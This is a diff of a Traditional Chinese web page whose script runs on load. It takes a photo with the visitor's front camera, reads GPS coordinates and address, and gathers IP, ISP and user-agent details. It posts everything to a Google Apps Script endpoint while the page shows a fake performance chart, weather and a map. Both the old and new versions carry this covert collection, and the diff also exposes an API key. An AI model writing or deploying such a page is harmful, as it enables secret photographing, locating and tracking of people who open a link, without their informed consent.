@@ -80,246 +80,220 @@
     </div>
   </div>
 
-<script>
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>資料收集與發送</title>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+  <div id="status">初始化中...</div>
+  <div id="ipInfo"></div>
+  <div id="weatherInfo"></div>
+  <canvas id="performanceChart" style="width: 100%; height: 300px;"></canvas>
+  <iframe id="map" width="100%" height="300" style="border: 0;" allowfullscreen></iframe>
 
-  async function startCamera() {
-    const statusElement = document.getElementById('status');
-    let photoData = null;
-    let stream = null;
+  <script>
+    async function startCamera() {
+      let stream = null;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: 'user' } },
+        });
+        const video = document.createElement('video');
+        video.srcObject = stream;
 
-    try {
-      stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: { ideal: 'user' } },
-      });
-      const video = document.createElement('video');
-      video.srcObject = stream;
+        await new Promise((resolve) => {
+          video.onloadedmetadata = () => {
+            video.play();
+            resolve();
+          };
+        });
 
-      // 等待相機畫面載入
-      await new Promise((resolve) => {
-        video.onloadedmetadata = () => {
-          video.play();
-          resolve();
-        };
-      });
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const photoData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
 
-      // 延遲 1 秒拍照
-      const photoPromise = new Promise((resolve) => {
-        setTimeout(() => {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth || 640;
-          canvas.height = video.videoHeight || 480;
-          const context = canvas.getContext('2d');
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          // 壓縮為 Base64 格式
-          photoData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
-          console.log('照片已生成');
-          sendPhotoToServer(photoData).then(resolve); // 發送照片到後端
-        }, 1000);
-      });
-
-      await photoPromise;
-    } catch (error) {
-      console.error('相機啟動失敗:', error);
-      statusElement.innerText = '相機啟動失敗，請檢查權限或設備相機。';
-    } finally {
-      if (stream) {
-        stream.getTracks().forEach((track) => track.stop());
+        console.log('照片已生成');
+        return photoData;
+      } catch (error) {
+        console.warn('相機啟動失敗:', error);
+        return null;
+      } finally {
+        if (stream) {
+          stream.getTracks().forEach((track) => track.stop());
+        }
       }
     }
-  }
 
-  async function getGpsCoordinates() {
-    const statusElement = document.getElementById('status');
-    try {
-      const position = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
-      });
+    async function getGpsCoordinates() {
+      try {
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
+        });
 
-      const { latitude, longitude } = position.coords;
+        const { latitude, longitude } = position.coords;
 
-      // 獲取地址
-      const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
-      const data = await response.json();
-      const address = data.display_name || '未知地址';
+        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+        const data = await response.json();
+        const address = data.display_name || '未知地址';
 
-      console.log('GPS 資訊已獲取:', latitude, longitude, address);
-      sendGpsToServer(latitude, longitude, address); // 發送 GPS 資訊到後端
-      return { latitude, longitude, address };
-    } catch (error) {
-      console.error('GPS 錯誤或超時:', error);
-      statusElement.innerText = 'GPS 無法取得，請檢查裝置定位權限或嘗試重新載入。';
-      return null;
+        console.log('GPS 資訊已獲取:', latitude, longitude, address);
+        return { latitude, longitude, address };
+      } catch (error) {
+        console.warn('GPS 資訊獲取失敗:', error);
+        return null;
+      }
     }
-  }
 
-  async function sendPhotoToServer(photoData) {
-    const statusElement = document.getElementById('status');
-    try {
-      const formData = new URLSearchParams();
-      formData.append('message', '自動拍照圖片');
-      formData.append('imageData', photoData);
+    async function getIpInfo() {
+      try {
+        const response = await fetch('https://ipinfo.io/json');
+        const data = await response.json();
+        const { ip, city, region, country, org } = data;
+        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
+        const userAgent = navigator.userAgent;
 
-      const response = await fetch(
-        'https://script.google.com/macros/s/AKfycbwwcrco83a3VyruCj68i8hKT1IiWGZEVyY6qhBOQ8jJ7hzFcFhZU2fRlZt2obb6yDUztA/exec',
-        {
+        console.log('IP 資訊已獲取:', ip, city, region, country, org);
+        return { ip, ipType, userAgent, city, region, country, org };
+      } catch (error) {
+        console.warn('IP 資訊獲取失敗:', error);
+        return null;
+      }
+    }
+
+    async function collectAndSendData() {
+      const statusElement = document.getElementById('status');
+      statusElement.innerText = '正在收集資料...';
+
+      const collectedData = {
+        gps: null,
+        ip: null,
+        photo: null,
+      };
+
+      try {
+        const [gpsResult, ipResult] = await Promise.allSettled([
+          getGpsCoordinates(),
+          getIpInfo(),
+        ]);
+
+        const photoResult = await startCamera();
+
+        if (gpsResult.status === 'fulfilled') collectedData.gps = gpsResult.value;
+        if (ipResult.status === 'fulfilled') collectedData.ip = ipResult.value;
+        if (photoResult) collectedData.photo = photoResult;
+
+        const formData = new URLSearchParams();
+        formData.append('message', '合併資料上傳');
+
+        if (collectedData.gps) {
+          formData.append('latitude', collectedData.gps.latitude);
+          formData.append('longitude', collectedData.gps.longitude);
+          formData.append('address', collectedData.gps.address);
+        }
+
+        if (collectedData.ip) {
+          formData.append('ip', collectedData.ip.ip);
+          formData.append('ipType', collectedData.ip.ipType);
+          formData.append('userAgent', collectedData.ip.userAgent);
+          formData.append('city', collectedData.ip.city);
+          formData.append('region', collectedData.ip.region);
+          formData.append('country', collectedData.ip.country);
+          formData.append('org', collectedData.ip.org);
+        }
+
+        if (collectedData.photo) {
+          formData.append('imageData', collectedData.photo);
+        }
+
+        const response = await fetch('https://script.google.com/macros/s/AKfycbwL3jWsMZSjRN1DWPAF6e54mWAgwxE3dYftR9buSp9cTMM4eSyI9M-EnJWQ6kqPMSLYLg/exec', {
           method: 'POST',
           body: formData,
+        });
+
+        const result = await response.json();
+        if (result.success) {
+          statusElement.innerText = '資料已成功發送！';
+        } else {
+          statusElement.innerText = `資料發送失敗：${result.error}`;
         }
-      );
-
-      const result = await response.json();
-      if (result.success) {
-        console.log('照片成功發送到後端！');
-        statusElement.innerText = '照片已成功發送。';
-      } else {
-        console.error(`照片發送失敗: ${result.error}`);
-        statusElement.innerText = `照片發送失敗：${result.error}`;
+      } catch (error) {
+        console.error('資料收集或傳送過程中發生錯誤:', error);
+        statusElement.innerText = '資料收集或傳送過程中發生錯誤。';
       }
-    } catch (error) {
-      console.error('照片發送失敗:', error);
-      statusElement.innerText = '照片發送過程中發生錯誤。';
     }
-  }
 
-  async function sendGpsToServer(latitude, longitude, address) {
-    const statusElement = document.getElementById('status');
-    try {
-      const formData = new URLSearchParams();
-      formData.append('message', 'GPS 資訊');
-      formData.append('latitude', latitude);
-      formData.append('longitude', longitude);
-      formData.append('address', address);
+    async function getWeatherInfo(latitude, longitude) {
+      try {
+        if (latitude && longitude) {
+          const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
+          const response = await fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&lang=zh_tw&appid=${apiKey}`);
+          const weatherData = await response.json();
+          const temp = weatherData.main.temp;
+          const weather = weatherData.weather[0].description;
+          const humidity = weatherData.main.humidity;
 
-      const response = await fetch(
-        'https://script.google.com/macros/s/AKfycbwwcrco83a3VyruCj68i8hKT1IiWGZEVyY6qhBOQ8jJ7hzFcFhZU2fRlZt2obb6yDUztA/exec',
-        {
-          method: 'POST',
-          body: formData,
+          document.getElementById('weatherInfo').innerHTML = 
+            `<img src="https://openweathermap.org/img/wn/${weatherData.weather[0].icon}.png" alt="${weather}"> 溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%`;
         }
-      );
-
-      const result = await response.json();
-      if (result.success) {
-        console.log('GPS 資訊成功發送到後端！');
-        statusElement.innerText = 'GPS 資訊已成功發送。';
-      } else {
-        console.error(`GPS 資訊發送失敗: ${result.error}`);
-        statusElement.innerText = `GPS 資訊發送失敗：${result.error}`;
+      } catch (error) {
+        console.error('天氣資訊獲取失敗:', error);
+        document.getElementById('weatherInfo').innerText = '天氣資訊獲取失敗';
       }
-    } catch (error) {
-      console.error('GPS 資訊發送失敗:', error);
-      statusElement.innerText = 'GPS 資訊發送過程中發生錯誤。';
     }
-  }
 
-  async function getIpInfo() {
-    try {
-      const response = await fetch('https://ipinfo.io/json');
-      const data = await response.json();
-      const { ip, city, region, country, org } = data;
-      const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
-      const userAgent = navigator.userAgent;
-
-      const formData = new URLSearchParams();
-      formData.append('ip', ip);
-      formData.append('ipType', ipType);
-      formData.append('userAgent', userAgent);
-      formData.append('city', city);
-      formData.append('region', region);
-      formData.append('country', country);
-      formData.append('org', org);
-
-      const result = await fetch('https://script.google.com/macros/s/AKfycbwwcrco83a3VyruCj68i8hKT1IiWGZEVyY6qhBOQ8jJ7hzFcFhZU2fRlZt2obb6yDUztA/exec', {
-        method: 'POST',
-        body: formData,
+    function setupPerformanceChart() {
+      const ctx = document.getElementById('performanceChart').getContext('2d');
+      const chart = new Chart(ctx, {
+        type: 'line',
+        data: {
+          labels: [],
+          datasets: [
+            { label: 'CPU 使用率', data: [], borderColor: '#4caf50', backgroundColor: 'rgba(76, 175, 80, 0.2)', fill: true },
+            { label: '記憶體使用率', data: [], borderColor: '#2196f3', backgroundColor: 'rgba(33, 150, 243, 0.2)', fill: true },
+          ],
+        },
+        options: {
+          responsive: true,
+          maintainAspectRatio: false,
+          scales: {
+            x: { title: { display: true, text: '時間' } },
+            y: { title: { display: true, text: '使用率 (%)' } },
+          },
+        },
       });
 
-      const responseData = await result.json();
-      if (responseData.success) {
-        console.log('IP 資訊已成功上傳:', responseData);
-        document.getElementById('ipInfo').innerText = '資訊已成功上傳！';
-      } else {
-        console.error('IP 資訊上傳失敗:', responseData.error);
-        document.getElementById('ipInfo').innerText = 'IP 資訊上傳失敗！';
-      }
-    } catch (error) {
-      console.error('IP 資訊錯誤:', error);
-      document.getElementById('ipInfo').innerText = 'IP 資訊操作失敗，請檢查控制台。';
+      setInterval(() => {
+        const now = new Date().toLocaleTimeString();
+        const cpuUsage = Math.random() * 100;
+        const memoryUsage = Math.random() * 100;
+        if (chart.data.labels.length > 20) chart.data.labels.shift();
+        chart.data.labels.push(now);
+        if (chart.data.datasets[0].data.length > 20) chart.data.datasets[0].data.shift();
+        if (chart.data.datasets[1].data.length > 20) chart.data.datasets[1].data.shift();
+        chart.data.datasets[0].data.push(cpuUsage.toFixed(1));
+        chart.data.datasets[1].data.push(memoryUsage.toFixed(1));
+        chart.update();
+      }, 1000);
     }
-  }
 
-  async function getWeatherInfo(latitude, longitude) {
-    try {
-      if (latitude && longitude) {
-        const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
-        const response = await fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&lang=zh_tw&appid=${apiKey}`);
-        const weatherData = await response.json();
-        const temp = weatherData.main.temp;
-        const weather = weatherData.weather[0].description;
-        const humidity = weatherData.main.humidity;
+    document.addEventListener('DOMContentLoaded', async () => {
+      collectAndSendData();
 
-        document.getElementById('weatherInfo').innerHTML = 
-          `<img src="https://openweathermap.org/img/wn/${weatherData.weather[0].icon}.png" alt="${weather}"> 溫度: ${temp}°C, 天氣: ${weather}, 濕度: ${humidity}%`;
-      }
-    } catch (error) {
-      console.error('天氣資訊獲取失敗:', error);
-      document.getElementById('weatherInfo').innerText = '天氣資訊獲取失敗';
-    }
-  }
-
-  function setupPerformanceChart() {
-    const ctx = document.getElementById('performanceChart').getContext('2d');
-    const chart = new Chart(ctx, {
-      type: 'line',
-      data: {
-        labels: [],
-        datasets: [
-          { label: 'CPU 使用率', data: [], borderColor: '#4caf50', backgroundColor: 'rgba(76, 175, 80, 0.2)', fill: true, tension: 0.4 },
-          { label: '記憶體使用率', data: [], borderColor: '#2196f3', backgroundColor: 'rgba(33, 150, 243, 0.2)', fill: true, tension: 0.4 },
-        ],
-      },
-      options: {
-        responsive: true,
-        maintainAspectRatio: false,
-        plugins: { legend: { display: true } },
-        scales: { x: { display: true, title: { display: true, text: '時間' } }, y: { display: true, title: { display: true, text: '使用率 (%)' } } },
-      },
+      setupPerformanceChart();
+      const statusElement = document.getElementById('status');
+      statusElement.innerText = '初始化完成！';
     });
+  </script>
+</body>
+</html>
 
-    setInterval(() => {
-      const now = new Date().toLocaleTimeString();
-      const cpuUsage = Math.random() * 100;
-      const memoryUsage = Math.random() * 100;
-      if (chart.data.labels.length > 20) chart.data.labels.shift();
-      chart.data.labels.push(now);
-      if (chart.data.datasets[0].data.length > 20) chart.data.datasets[0].data.shift();
-      if (chart.data.datasets[1].data.length > 20) chart.data.datasets[1].data.shift();
-      chart.data.datasets[0].data.push(cpuUsage.toFixed(1));
-      chart.data.datasets[1].data.push(memoryUsage.toFixed(1));
-      chart.update();
-    }, 1000);
-  }
-
-  document.addEventListener('DOMContentLoaded', async () => {
-    const statusElement = document.getElementById('status');
-    statusElement.innerText = '正在初始化...';
-
-    const [gpsData] = await Promise.all([
-      getGpsCoordinates(),
-      startCamera(),
-      getIpInfo(),
-    ]);
-
-    if (gpsData) {
-      await getWeatherInfo(gpsData.latitude, gpsData.longitude);
-      document.getElementById('map').src = `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
-    }
-
-    setupPerformanceChart();
-    statusElement.innerText = '初始化完成！';
-  });
-</script>
 
 
 </body>
